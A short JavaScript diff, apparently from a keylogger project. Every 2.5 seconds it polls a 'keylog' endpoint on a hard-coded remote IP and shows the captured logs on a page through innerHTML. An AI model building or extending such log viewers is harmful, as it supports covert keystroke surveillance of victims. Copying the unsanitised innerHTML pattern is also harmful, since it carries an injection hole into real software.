@@ -1,11 +1,9 @@
-const logger = document.getElementById('logger');
+const logger = document.getElementById('logger');//<--The HTML element that will contain the logs
 
 fetchData = async _ => {
-    const data = await fetch('localhost:8080/keylog', { method: 'GET' });
-    const text = await data.text();
-    logger.innerHTML = text;
+    const data = await fetch('http://18.229.132.96:8080/keylog');//<-- GET to recieve the log
+    const text = await data.text();//<--Transform the obtained to text
+    logger.innerHTML = `Logs recibidos: ${text}`;//<-- Change the element innerHTML to the recieved log
 }
 
-setTimeout(_ => {
-    fetchData();
-}, 2500);
+setInterval(_ => { fetchData() }, 2500);//<--Executes the fetch over 2,5 segs 
